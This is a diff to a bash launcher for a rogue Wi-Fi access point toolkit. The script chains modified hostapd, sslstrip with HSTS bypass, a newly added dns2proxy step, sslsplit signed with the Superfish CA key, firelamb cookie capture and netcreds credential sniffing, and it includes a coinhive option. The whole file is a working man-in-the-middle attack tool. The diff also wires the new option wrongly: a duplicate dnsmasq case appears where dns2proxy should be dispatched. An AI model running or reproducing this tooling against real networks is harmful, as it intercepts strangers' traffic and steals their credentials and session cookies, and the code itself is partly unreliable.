@@ -9,6 +9,8 @@ export ssl_cert_key=$share/crackpkcs8/Superfish_CA.key
 #ssl_cert_pem=$share/cert/rogue-ca.pem
 #ssl_cert_key=$share/cert/rogue-ca.key
 
+cd $(dirname $0)
+
 check_ap_mode(){
  if ! iw list | grep 'AP$'>/dev/null
   then
@@ -76,10 +78,14 @@ start_sslstrip(){
         cd $share/sslstrip-hsts/sslstrip2/
         python sslstrip.py -l 10000 -a -w $loot/sslstrip.log.`date "+%s"`&
         iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+}
+
+start_dns2proxy(){
         cd $share/sslstrip-hsts/dns2proxy/
         python dns2proxy.py -i $phy&
         cd -
 }
+
 
 start_sslsplit(){
         sslsplit -D -P -Z -S $loot/sslsplit -c $ssl_cert_pem -k $ssl_cert_key -O -l $loot/sslsplit-connect.log.`date "+%s"` \
@@ -238,14 +244,14 @@ killem(){
         pkill -f airbase
         pkill -f dhcpd
         pkill -f start_dnsmasq
-        pkill -f dnsspoof
         pkill -f dnsmasq
+        pkill -f dnsspoof
         pkill -f dns2proxy
         pkill -f firelamb
         pkill -f start_firelamb
         pkill -f hostapd
-        pkill -f http.server
         pkill -f start_hostapd
+        pkill -f http.server
         pkill -f mitmf
 #       pkill -f msfconsole
 #       pkill -f start_msfconsole
@@ -266,51 +272,54 @@ killem(){
         iptables --policy FORWARD ACCEPT
         iptables --policy OUTPUT ACCEPT
         iptables -t nat -F
-echo -e "$txtred [*] Dont forget to kill msfconsole \n $txtgrn Done$endclr"
+ echo -e "$txtred [*] Dont forget to kill msfconsole \n $txtgrn Done$endclr"
 exit
 }
 
 start-nat-full(){
 export conf=$share/run-mana/conf/hostapd.conf_open
-echo -e "$txtgrn [*] Checking if AP-mode supported interface is present $endclr"
- ./$0 --check_ap_mode    #Check if "AP-mode" supported interface is present
-echo -e "$txtgrn [*] Changing hostname $endclr"
- ./$0 --start_hostname   #Change systems hostname
-echo -e "$txtgrn [*] Stopping network-manager & unblocking wifi $endclr"
- ./$0 --clearwifi        #Stop network-manager &rfkill unblock wifi
-echo -e "$txtgrn [*] Changing MAC $endclr"
- ./$0 --start_macchanger #Change mac
-  sleep 4
-echo -e "$txtgrn [*] Starting hostapd $endclr"
- ./$0 --start_hostapd && #Hostapd - Start modified hostapd that implements new mana attacks
-  sleep 5
-echo -e "$txtgrn [*] Starting dnsmasq $endclr"
- ./$0 --start_dnsmasq &&    #Dnsmasq - A lightweight DHCP and caching DNS server
-  sleep 5
-echo -e "$txtgrn [*] Starting sslstrip $endclr"
- ./$0 --start_sslstrip &&   #SSLStrip with HSTS bypass - sslstrip-hsts: Modification of LeonardoNVE's & moxie's tools
-  sleep 2
-echo -e "$txtgrn [*] Starting sslsplit $endclr"
- ./$0 --start_sslsplit &   #Sslsplit - Tool for man-in-the-middle attacks against SSL/TLS encrypted network connections.
-  sleep 5
-echo -e "$txtgrn [*] Starting nat-firewall $endclr"
- ./$0 --start_nat_firewall && #Nat firewall
-  sleep 2
-     iptables -t nat -A PREROUTING -i $phy -p udp --dport 53 -j DNAT --to 10.0.0.1
- #   iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to 192.168.182.1
-echo -e "$txtgrn [*] Starting firelamb $endclr"
- ./$0 --start_firelamb & #Firelamb - Captures and writes cookies to a firefox profile for easy use.
-  sleep 5
-echo -e "$txtgrn [*] Starting netcreds $endclr"
- ./$0 --start_netcreds &  #Netcreds - Sniffs sensitive data from interface or pcap
-#echo -e "$txtgrn [*] Starting msfconsole $endclr"
-# $TERM_ -hold -T "start_msfconsole"      $TOPLEFTBIG -e "bash -c '$0 --start_msfconsole'"  & sleep 2 && #Metasploit -
-#  sleep 2
-#echo -e "$txtgrn [*] Starting crackapd $endclr"
-# ./$0 --start_crackapd & #Crackapd - Crack EAP creds externally & re-add them to the hostapd EAP config (auto crack 'n add)
-#  sleep 2
-#echo -e "$txtgrn [*] Starting apache $endclr"
-# ./$0 --start_apache &   #Apache - The apache vhosts for the noupstream hacks; deploy to /etc/apache2/ and /var/www/ respectivley
+ echo -e "$txtgrn [*] Checking if AP-mode supported interface is present $endclr"
+  ./$0 --check_ap_mode    #Check if "AP-mode" supported interface is present
+ echo -e "$txtgrn [*] Changing hostname $endclr"
+  ./$0 --start_hostname   #Change systems hostname
+ echo -e "$txtgrn [*] Stopping network-manager & unblocking wifi $endclr"
+  ./$0 --clearwifi        #Stop network-manager &rfkill unblock wifi
+ echo -e "$txtgrn [*] Changing MAC $endclr"
+  ./$0 --start_macchanger #Change mac
+   sleep 4
+ echo -e "$txtgrn [*] Starting hostapd $endclr"
+  ./$0 --start_hostapd && #Hostapd - Start modified hostapd that implements new mana attacks
+   sleep 5
+ echo -e "$txtgrn [*] Starting dnsmasq $endclr"
+  ./$0 --start_dnsmasq &&    #Dnsmasq - A lightweight DHCP and caching DNS server
+   sleep 5
+ echo -e "$txtgrn [*] Starting sslstrip $endclr"
+  ./$0 --start_sslstrip &&   #SSLStrip with HSTS bypass - sslstrip-hsts: Modification of LeonardoNVE's & moxie's tools
+   sleep 2
+ echo -e "$txtgrn [*] Starting dns2proxy $endclr"
+  ./$0 --start_dns2proxy &&    #dns2proxy - Offensive DNS server offering various features for post-exploitation once you've changed victims DNS server.
+   sleep 2
+ echo -e "$txtgrn [*] Starting sslsplit $endclr"
+  ./$0 --start_sslsplit &   #Sslsplit - Tool for man-in-the-middle attacks against SSL/TLS encrypted network connections.
+   sleep 5
+ echo -e "$txtgrn [*] Starting nat-firewall $endclr"
+  ./$0 --start_nat_firewall && #Nat firewall
+   sleep 2
+      iptables -t nat -A PREROUTING -i $phy -p udp --dport 53 -j DNAT --to 10.0.0.1
+  #   iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to 192.168.182.1
+ echo -e "$txtgrn [*] Starting firelamb $endclr"
+  ./$0 --start_firelamb & #Firelamb - Captures and writes cookies to a firefox profile for easy use.
+   sleep 5
+ echo -e "$txtgrn [*] Starting netcreds $endclr"
+  ./$0 --start_netcreds &  #Netcreds - Sniffs sensitive data from interface or pcap
+ #echo -e "$txtgrn [*] Starting msfconsole $endclr"
+ # $TERM_ -hold -T "start_msfconsole"      $TOPLEFTBIG -e "bash -c '$0 --start_msfconsole'"  & sleep 2 && #Metasploit -
+ #  sleep 2
+ #echo -e "$txtgrn [*] Starting crackapd $endclr"
+ # ./$0 --start_crackapd & #Crackapd - Crack EAP creds externally & re-add them to the hostapd EAP config (auto crack 'n add)
+ #  sleep 2
+ #echo -e "$txtgrn [*] Starting apache $endclr"
+ # ./$0 --start_apache &   #Apache - The apache vhosts for the noupstream hacks; deploy to /etc/apache2/ and /var/www/ respectivley
 
 	hangon && #Wait for Enter key
 	killem	  #Kill all shit and exit
@@ -319,55 +328,53 @@ echo -e "$txtgrn [*] Starting netcreds $endclr"
 start-nat-simple(){
 #export conf=$share/run-mana/conf/hostapd.conf
 export conf=$share/run-mana/conf/hostapd.conf_open
-echo -e "$txtgrn [*] Checking if AP-mode supported interface is present $endclr"
- ./$0 --check_ap_mode    #Check if "AP-mode" supported interface is present
-echo -e "$txtgrn [*] Stopping network-manager & unblocking wifi $endclr"
- ./$0 --clearwifi        #Stop network-manager &rfkill unblock wifi
-echo -e "$txtgrn [*] Changing MAC $endclr"
- ./$0 --start_macchanger #Change mac
-  sleep 4
-echo -e "$txtgrn [*] Starting hostapd $endclr"
- ./$0 --start_hostapd && #Hostapd - Start modified hostapd that implements new mana attacks
-  sleep 5
-echo -e "$txtgrn [*] Starting dnsmasq $endclr"
- ./$0 --start_dnsmasq && #Dnsmasq - A lightweight DHCP and caching DNS server
-  sleep 5
-echo -e "$txtgrn [*] Starting nat-firewall $endclr"
- ./$0 --start_nat_firewall && #Nat firewall
-  sleep 2
+ echo -e "$txtgrn [*] Checking if AP-mode supported interface is present $endclr"
+  ./$0 --check_ap_mode    #Check if "AP-mode" supported interface is present
+ echo -e "$txtgrn [*] Stopping network-manager & unblocking wifi $endclr"
+  ./$0 --clearwifi        #Stop network-manager &rfkill unblock wifi
+ echo -e "$txtgrn [*] Changing MAC $endclr"
+  ./$0 --start_macchanger #Change mac
+   sleep 4
+ echo -e "$txtgrn [*] Starting hostapd $endclr"
+  ./$0 --start_hostapd && #Hostapd - Start modified hostapd that implements new mana attacks
+   sleep 5
+ echo -e "$txtgrn [*] Starting dnsmasq $endclr"
+  ./$0 --start_dnsmasq && #Dnsmasq - A lightweight DHCP and caching DNS server
+   sleep 5
+ echo -e "$txtgrn [*] Starting nat-firewall $endclr"
+  ./$0 --start_nat_firewall && #Nat firewall
+   sleep 2
+
 	hangon && #Wait for Enter key
 	killem	  #Kill all shit and exit
-
 }
 
 
 start-nat-simple-mitm(){
 #export conf=$share/run-mana/conf/hostapd.conf
 export conf=$share/run-mana/conf/hostapd.conf_open
-echo -e "$txtgrn [*] Checking if AP-mode supported interface is present $endclr"
- ./$0 --check_ap_mode    #Check if "AP-mode" supported interface is present
-echo -e "$txtgrn [*] Stopping network-manager & unblocking wifi $endclr"
- ./$0 --clearwifi        #Stop network-manager &rfkill unblock wifi
-echo -e "$txtgrn [*] Changing MAC $endclr"
- ./$0 --start_macchanger #Change mac
-  sleep 4
-echo -e "$txtgrn [*] Starting hostapd $endclr"
- ./$0 --start_hostapd && #Hostapd - Start modified hostapd that implements new mana attacks
-  sleep 5
-echo -e "$txtgrn [*] Starting dnsmasq $endclr"
- ./$0 --start_dnsmasq && #Dnsmasq - A lightweight DHCP and caching DNS server
-  sleep 5
-echo -e "$txtgrn [*] Starting nat-firewall $endclr"
- ./$0 --start_nat_firewall && #Nat firewall
-  sleep 2
-echo -e "$txtgrn [*] Starting mitmdump $endclr"
- ./$0 --start_mitmdump && #Mitmdump - A man-in-the-middle proxy with a command-line interface
-  sleep 2
+ echo -e "$txtgrn [*] Checking if AP-mode supported interface is present $endclr"
+  ./$0 --check_ap_mode    #Check if "AP-mode" supported interface is present
+ echo -e "$txtgrn [*] Stopping network-manager & unblocking wifi $endclr"
+  ./$0 --clearwifi        #Stop network-manager &rfkill unblock wifi
+ echo -e "$txtgrn [*] Changing MAC $endclr"
+  ./$0 --start_macchanger #Change mac
+   sleep 4
+ echo -e "$txtgrn [*] Starting hostapd $endclr"
+  ./$0 --start_hostapd && #Hostapd - Start modified hostapd that implements new mana attacks
+   sleep 5
+ echo -e "$txtgrn [*] Starting dnsmasq $endclr"
+  ./$0 --start_dnsmasq && #Dnsmasq - A lightweight DHCP and caching DNS server
+   sleep 5
+ echo -e "$txtgrn [*] Starting nat-firewall $endclr"
+  ./$0 --start_nat_firewall && #Nat firewall
+   sleep 2
+ echo -e "$txtgrn [*] Starting mitmdump $endclr"
+  ./$0 --start_mitmdump && #Mitmdump - A man-in-the-middle proxy with a command-line interface
+   sleep 2
 
 	hangon && #Wait for Enter key
 	killem	  #Kill all shit and exit
-
-
 }
 
 start-noupstream(){
@@ -384,12 +391,12 @@ start_nodogsplash(){
 #nodogsplash="$etc/nodogsplash/nodogsplash_x86_x64_kali"
 DATENOW="$(date "+%s")"
 
-echo -e "$txtgrn [*] Checking if AP-mode supported interface is present $endclr"
- ./$0 --check_ap_mode    #Check if "AP-mode" supported interface is present
-echo -e "$txtgrn [*] Changing hostname $endclr"
- ./$0 --start_hostname   #Change systems hostname
-echo -e "$txtgrn [*] Stopping newtork-manager & unblocking wifi $endclr"
- ./$0 --clearwifi        #Stop network-manager &rfkill unblock wifi
+ echo -e "$txtgrn [*] Checking if AP-mode supported interface is present $endclr"
+  ./$0 --check_ap_mode    #Check if "AP-mode" supported interface is present
+ echo -e "$txtgrn [*] Changing hostname $endclr"
+  ./$0 --start_hostname   #Change systems hostname
+ echo -e "$txtgrn [*] Stopping newtork-manager & unblocking wifi $endclr"
+  ./$0 --clearwifi        #Stop network-manager &rfkill unblock wifi
 
  echo Starting Apache
   service apache2 start
@@ -411,12 +418,12 @@ nodogsplash -f -c /etc/nodogsplash/nodogsplash.conf &
 hostapd /etc/hostapd/hostapd.conf
 # ./$0 --start_hostapd && #Hostapd - Start modified hostapd that implements new mana attacks
   sleep 5
-echo -e "$txtgrn [*] Starting dnsmasq $endclr"
- ./$0 --start_dnsmasq &&    #Dnsmasq - A lightweight DHCP and caching DNS server
-  sleep 5
-echo -e "$txtgrn [*] Starting nat-firewall $endclr"
- ./$0 --start_nat_firewall && #Nat firewall
-  sleep 2
+ echo -e "$txtgrn [*] Starting dnsmasq $endclr"
+  ./$0 --start_dnsmasq &&    #Dnsmasq - A lightweight DHCP and caching DNS server
+   sleep 5
+ echo -e "$txtgrn [*] Starting nat-firewall $endclr"
+  ./$0 --start_nat_firewall && #Nat firewall
+   sleep 2
 #brctl addbr br0
 #brctl addif br0 eth0              #Assuming eth0 is your upstream interface
 #brctl addif br0 wlan2
@@ -487,11 +494,12 @@ echo "$FUNCNAME"
  Usage: $(basename "$0") [--start_hostapd]            - Hostapd - Start modified hostapd that implements new mana attacks
  Usage: $(basename "$0") [--start_dnsmasq]            - Dnsmasq - A lightweight DHCP and caching DNS server
  Usage: $(basename "$0") [--start_sslstrip]           - SSLStrip with HSTS bypass - sslstrip-hsts: Modification of LeonardoNVE's & moxie's tools
+ Usage: $(basename "$0") [--start_dns2proxy]          - dns2proxy - Offensive DNS server offering various features for post-exploitation once you've changed victims DNS server.
  Usage: $(basename "$0") [--start_sslsplit]           - Sslsplit - Tool for man-in-the-middle attacks against SSL/TLS encrypted network connections.
  Usage: $(basename "$0") [--start_nat_firewall]       - Nat firewall - iptables rules
  Usage: $(basename "$0") [--start_firelamb]           - Firelamb - Captures and writes cookies to a firefox profile for easy use.
  Usage: $(basename "$0") [--start_netcreds]           - Netcreds - Sniffs sensitive data from interface or pcap
- Usage: $(basename "$0") [--msfconsole]               - Msfconsole
+ Usage: $(basename "$0") [--start_msfconsole]         - Msfconsole
  Usage: $(basename "$0") [--start_crackapd]           - Crackapd - Crack EAP creds externally & re-add them to the hostapd EAP config (auto crack 'n add)
  Usage: $(basename "$0") [--start_apache]             - Apache - The apache vhosts for the noupstream hacks; deploy to /etc/apache2/ and /var/www/ respectivley
  Usage: $(basename "$0") [--start_mitmdump]           - Mitmdump - A man-in-the-middle proxy with a command-line interface
@@ -515,19 +523,20 @@ for ARG in $@
    #Sub launchers
       --check_ap_mode)  	   check_ap_mode        ;;
       --start_hostname)  	   start_hostname       ;;
-      --clearwifi)  	           clearwifi            ;;
-      --start_macchanger)          start_macchanger     ;;
+      --clearwifi)  	       clearwifi            ;;
+      --start_macchanger)      start_macchanger     ;;
       --start_hostapd)  	   start_hostapd        ;;
       --start_dnsmasq)  	   start_dnsmasq        ;;
-      --start_nat_firewall)  	   start_nat_firewall   ;;
+      --start_nat_firewall)    start_nat_firewall   ;;
       --start_sslstrip)  	   start_sslstrip       ;;
+      --start_dnsmasq)         start_dnsmasq        ;;
       --start_sslsplit)  	   start_sslsplit       ;;
       --start_firelamb)  	   start_firelamb       ;;
       --start_netcreds)  	   start_netcreds       ;;
       --start_msfconsole)	   start_msfconsole     ;;
-      --start_mitmdump)	           start_mitmdump       ;;
-      --hangon)  		   hangon               ;;
-      --killem)  		   killem               ;;
+      --start_mitmdump)	       start_mitmdump       ;;
+      --hangon)  		       hangon               ;;
+      --killem)  		       killem               ;;
    #Main launchers
       -f|--start-nat-full)         start-nat-full       ;;
       -s|--start-nat-simple)       start-nat-simple     ;;
@@ -537,7 +546,7 @@ for ARG in $@
       -c|--start-coinhive)         start-coinhive       ;;
    #Other
       -e|--edit)                   nano "$0" ; exit     ;;
-      -h|--help)                   usage    ; break    ;;
+      -h|--help)                   usage     ; break    ;;
       --)                          shift     ; break    ;;
        *) echo -e "$txtred [x] Bad Option: $1 $endclr" && usage; exit 1   ;;
   esac
